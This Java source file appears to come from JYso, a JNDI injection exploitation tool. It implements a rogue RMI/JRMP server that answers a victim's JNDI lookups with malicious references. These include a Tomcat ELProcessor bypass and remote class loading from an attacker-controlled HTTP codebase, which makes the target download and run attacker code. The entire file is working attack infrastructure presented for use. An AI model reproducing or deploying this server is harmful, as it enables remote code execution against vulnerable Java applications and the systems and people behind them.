package com.qi4l.JYso;

import com.qi4l.JYso.controllers.rmi.Basic;
import com.qi4l.JYso.controllers.rmi.ELProcessor;
import com.qi4l.JYso.gadgets.utils.Utils;
import com.qi4l.JYso.gadgets.utils.MarshalOutputStream;
import com.qi4l.JYso.gadgets.utils.Reflections;
import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;
import org.fusesource.jansi.Ansi;
import sun.rmi.server.UnicastServerRef;
import sun.rmi.transport.TransportConstants;

import javax.naming.Reference;
import javax.net.ServerSocketFactory;
import java.io.BufferedInputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.ObjectStreamClass;
import java.net.InetSocketAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.SocketException;
import java.net.URL;
import java.rmi.MarshalException;
import java.rmi.server.ObjID;
import java.rmi.server.RemoteObject;
import java.rmi.server.UID;
import java.util.Arrays;
import java.util.Locale;

import static com.qi4l.JYso.gadgets.Config.Config.codeBase;
import static com.qi4l.JYso.gadgets.Config.Config.httpPort;
import static com.qi4l.JYso.gadgets.Config.Config.ip;
import static com.qi4l.JYso.gadgets.Config.Config.rmiPort;
import static org.fusesource.jansi.Ansi.ansi;

/**
 * Minimal JRMP listener used by JNDI/RMI lookup.
 * Supports:
 * 1) /basic/... and /ELProcessor/... (legacy route compatibility)
 * 2) /remote/{fully.qualified.ClassName} (remote class loading)
 * 3) /local/{fully.qualified.ClassName}  (local class loading)
 */
@SuppressWarnings("restriction")
public class RMIServer implements Runnable {

    public static boolean isRunning = false;
    private static RMIServer instance;

    private final ServerSocket ss;
    private final Object waitLock = new Object();
    private final URL classpathUrl;
    private boolean exit;

    public RMIServer(int port, URL classpathUrl) throws IOException {
        this.classpathUrl = classpathUrl;
        this.ss = ServerSocketFactory.getDefault().createServerSocket(port);
    }

    @SuppressWarnings("HttpUrlsUsage")
    public static void start() {
        String url = (codeBase == null || codeBase.isEmpty()) ? "http://" + ip + ":" + httpPort + "/" : codeBase;

        try {
            System.out.println(ansi().render("@|green [+]|@ RMI Server Start Listening on >> " + rmiPort + "..."));
            instance = new RMIServer(rmiPort, new URL(url));
            isRunning = true;
            instance.run();
        } catch (Exception e) {
            System.err.println("Listener error");
            e.printStackTrace(System.err);
        }
    }

    public static void stop() {
        if (instance != null) {
            instance.close();
            isRunning = false;
            System.out.println(ansi().render("@|yellow [!]|@ RMI Server stopped"));
        }
    }

    private static void handleDGC(ObjectInputStream ois) throws IOException, ClassNotFoundException {
        ois.readInt(); // method
        ois.readLong(); // hash
        System.err.println("Is DGC call for " + Arrays.toString((ObjID[]) ois.readObject()));
    }

    public void close() {
        this.exit = true;
        try {
            this.ss.close();
        } catch (IOException ignored) {
        }
        synchronized (this.waitLock) {
            this.waitLock.notify();
        }
    }

    @Override
    public void run() {
        try {
            Socket s = null;
            try {
                while (!this.exit && (s = this.ss.accept()) != null) {
                    try {
                        s.setSoTimeout(5000);
                        InetSocketAddress remote = (InetSocketAddress) s.getRemoteSocketAddress();

                        InputStream is = s.getInputStream();
                        InputStream bufIn = is.markSupported() ? is : new BufferedInputStream(is);
                        bufIn.mark(4);

                        try (DataInputStream in = new DataInputStream(bufIn)) {
                            DataOutputStream out = Utils.handshake(in, s);
                            if (out == null) {
                                continue;
                            }
                            try {
                                byte protocol = in.readByte();
                                switch (protocol) {
                                    case TransportConstants.StreamProtocol:
                                        out.writeByte(TransportConstants.ProtocolAck);
                                        if (remote.getHostName() != null) {
                                            out.writeUTF(remote.getHostName());
                                        } else {
                                            out.writeUTF(remote.getAddress().toString());
                                        }
                                        out.writeInt(remote.getPort());
                                        out.flush();
                                        in.readUTF();
                                        in.readInt();
                                    case TransportConstants.SingleOpProtocol:
                                        doMessage(s, in, out);
                                        break;
                                    default:
                                        System.err.println("Unsupported protocol");
                                        s.close();
                                        continue;
                                }

                                out.flush();
                            } finally {
                                out.close();
                            }
                        }
                    } catch (InterruptedException e) {
                        return;
                    } catch (Exception e) {
                        e.printStackTrace(System.err);
                    } finally {
                        System.out.println(Ansi.ansi().fgRgb(255, 165, 0).a("  Closing connection").reset());
                        s.close();
                    }
                }
            } finally {
                if (s != null) {
                    s.close();
                }
                if (this.ss != null) {
                    this.ss.close();
                }
            }
        } catch (SocketException ignored) {
        } catch (Exception e) {
            e.printStackTrace(System.err);
        }
    }

    private void doMessage(Socket s, DataInputStream in, DataOutputStream out) throws Exception {
        int op = in.read();

        switch (op) {
            case TransportConstants.Call:
                doCall(in, out);
                break;
            case TransportConstants.Ping:
                out.writeByte(TransportConstants.PingAck);
                break;
            case TransportConstants.DGCAck:
                UID.read(in);
                break;
            default:
                throw new IOException("RMI server cannot recognize operation: " + op);
        }

        s.close();
    }

    private void doCall(DataInputStream in, DataOutputStream out) throws Exception {
        ObjectInputStream ois = new ObjectInputStream(in) {
            @Override
            protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException {
                if ("[Ljava.rmi.server.ObjID;".equals(desc.getName())) {
                    return ObjID[].class;
                } else if ("java.rmi.server.ObjID".equals(desc.getName())) {
                    return ObjID.class;
                } else if ("java.rmi.server.UID".equals(desc.getName())) {
                    return UID.class;
                } else if ("java.lang.String".equals(desc.getName())) {
                    return String.class;
                }
                throw new IOException("RMI server cannot deserialize this type");
            }
        };

        ObjID read;
        try {
            read = ObjID.read(ois);
        } catch (IOException e) {
            throw new MarshalException("RMI server cannot read ObjID", e);
        }

        if (read.hashCode() == 2) {
            handleDGC(ois);
        } else if (read.hashCode() == 0) {
            if (handleRMI(ois, out)) {
                synchronized (this.waitLock) {
                    this.waitLock.notifyAll();
                }
            }
        }
    }

    private boolean handleRMI(ObjectInputStream ois, DataOutputStream out) throws Exception {
        int method = ois.readInt();
        ois.readLong();

        if (method != 2) {
            return false;
        }

        String object = ((String) ois.readObject()).replace('\\', '/');
        if (object.startsWith("/")) {
            object = object.substring(1);
        }
        String objectLower = object.toLowerCase(Locale.ROOT);

        out.writeByte(TransportConstants.Return);
        try (ObjectOutputStream oos = new MarshalOutputStream(out, this.classpathUrl)) {
            oos.writeByte(TransportConstants.NormalReturn);
            new UID().write(oos);

            ReferenceWrapper rw = null;
            if (objectLower.startsWith("elprocessor")) {
                ResourceRef result = ELProcessor.refTomcatBypass(object);
                rw = new ReferenceWrapper(result);
            } else if (objectLower.startsWith("basic")) {
                Reference result = Basic.basic(object);
                rw = wrapReference(result);
            } else if (objectLower.startsWith("remote/")) {
                String className = normalizeClassName(object.substring("remote/".length()));
                Reference result = new Reference("Foo", className, codeBase);
                System.out.println(ansi().fgBrightBlue().a("  [RMI] remote class loading -> " + className).reset());
                rw = wrapReference(result);
            } else if (objectLower.startsWith("local/")) {
                String className = normalizeClassName(object.substring("local/".length()));
                Reference result = new Reference("Foo", className, null);
                System.out.println(ansi().fgBrightBlue().a("  [RMI] local class loading -> " + className).reset());
                rw = wrapReference(result);
            } else {
                System.out.println(ansi().fgBrightRed().a("  [RMI] unsupported lookup path: " + object).reset());
            }

            if (rw == null) {
                oos.writeObject(null);
                oos.flush();
                out.flush();
                return false;
            }

            java.lang.reflect.Field refF = RemoteObject.class.getDeclaredField("ref");
            refF.setAccessible(true);
            refF.set(rw, new UnicastServerRef(12345));

            oos.writeObject(rw);
            oos.flush();
            out.flush();
        }
        return true;
    }

    private ReferenceWrapper wrapReference(Reference reference) throws Exception {
        ReferenceWrapper rw = Reflections.createWithoutConstructor(ReferenceWrapper.class);
        Reflections.setFieldValue(rw, "wrappee", reference);
        return rw;
    }

    private String normalizeClassName(String classPathLikeName) {
        return classPathLikeName.replace('/', '.').trim();
    }
}
